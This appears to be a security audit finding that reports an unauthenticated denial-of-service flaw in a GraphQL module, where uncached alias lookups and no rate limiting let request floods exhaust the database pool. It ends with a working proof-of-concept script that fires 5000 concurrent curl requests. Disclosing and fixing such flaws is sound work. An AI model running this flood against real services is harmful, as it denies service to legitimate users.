### Title
Unauthenticated DoS via Unbounded Alias-Based DB Queries in GraphQL `getByAliasAndType()`

### Summary
The GraphQL module's `EntityServiceImpl.getByAliasAndType()` issues an uncached native SQL query against the `entity` table for every unique alias submitted. There is no rate limiting on the GraphQL endpoint and no result-level cache on `EntityRepository.findByAlias()`. An unauthenticated attacker can flood the endpoint with unique aliases, exhausting the HikariCP database connection pool and denying service to legitimate users.

### Finding Description
**Code path:**

`AccountController.account()` (line 47–48) → `EntityServiceImpl.getByAliasAndType()` (line 29–31) → `EntityRepository.findByAlias()` (line 13–14), which executes:
```sql
select * from entity where alias = ?1 and deleted is not true
```
as a native query with no `@Cacheable` annotation.

**Root cause — three compounding absences:**

1. **No result cache on `findByAlias()`.**
   The graphql module's `EntityRepository` has no `@Cacheable` on `findByAlias()`. [1](#0-0) 
   Compare with the `grpc` module's `EntityRepository`, which does annotate `findById` with `@Cacheable`. The graphql module has no equivalent.

2. **The only cache present caches query *structure*, not query *results*.**
   `CachedPreparsedDocumentProvider` caches the parsed GraphQL document keyed on the query string. Because the alias value is passed as a GraphQL *variable* (not inlined in the query string), the same query template is reused — but the data-fetching layer still calls `findByAlias()` for every unique alias value. [2](#0-1) 

3. **No rate limiting on the GraphQL endpoint.**
   The bucket4j throttle (`ThrottleManagerImpl`, `ThrottleConfiguration`) exists only in the `web3` module. The `graphql` module has no equivalent. `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` bound the *shape* of a single query, not the *rate* of requests. [3](#0-2) 

**Exploit flow:**

```
POST /graphql  (repeated N times, each with a distinct alias variable)
{ "query": "query($a:String!){account(input:{alias:$a}){id}}", "variables":{"a":"<unique_base32>"} }
```

Each request: decodes the alias → issues a full table scan / index lookup on `entity.alias` → holds a JDBC connection for the duration. With enough concurrent requests, HikariCP's pool is saturated.

### Impact Explanation
Database connection pool exhaustion causes all subsequent queries — including those serving legitimate submitted-transaction lookups — to queue and eventually time out. The Prometheus alert `GraphQLHighDBConnections` (threshold 75 %) confirms the project itself recognises this as a critical failure mode, but the alert is reactive, not preventive. [4](#0-3) 

### Likelihood Explanation
No authentication, API key, or IP-based rate limit is required. Any internet-reachable deployment is exploitable with a simple HTTP client loop. Generating unique valid Base32 aliases is trivial (random bytes, Base32-encoded). The attack is repeatable and stateless.

### Recommendation
Apply at least two of the following:

1. **Add `@Cacheable` to `EntityRepository.findByAlias()`** in the graphql module (mirror the grpc module pattern), so repeated lookups for the same alias hit an in-process cache instead of the database.
2. **Add a per-IP or global request-rate limiter** to the graphql module (e.g., bucket4j filter identical to `ThrottleManagerImpl` in `web3`).
3. **Set a minimum HikariCP connection-acquisition timeout** and return HTTP 429 when the pool is saturated, rather than queuing indefinitely.

### Proof of Concept
```bash
# Generate 5000 unique aliases and fire them concurrently
python3 -c "
import base64, os, subprocess, threading
def send(alias):
    subprocess.run(['curl','-s','-X','POST','http://<host>/graphql',
      '-H','Content-Type: application/json',
      '-d', f'{{\"query\":\"query(\$a:String!){{account(input:{{alias:\$a}}){{id}}}}\",\"variables\":{{\"a\":\"{alias}\"}}}}'])
threads=[threading.Thread(target=send,args=(base64.b32encode(os.urandom(20)).decode(),)) for _ in range(5000)]
[t.start() for t in threads]
[t.join() for t in threads]
"
# Observe: legitimate requests begin returning 500/timeout as HikariCP pool is exhausted
```
